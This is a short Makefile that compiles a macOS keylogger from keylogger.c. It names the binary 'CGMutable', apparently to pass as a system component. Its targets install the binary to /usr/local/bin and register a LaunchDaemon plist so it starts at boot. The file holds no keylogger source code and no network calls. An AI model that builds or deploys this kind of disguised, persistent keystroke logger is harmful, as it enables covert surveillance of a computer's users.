CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=CGMutable
PLIST=CGMutable.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

startup: install
	cp $(PLIST) /Library/LaunchDaemons
	open /usr/local/bin/.

clean:
	rm $(EXECUTABLE)
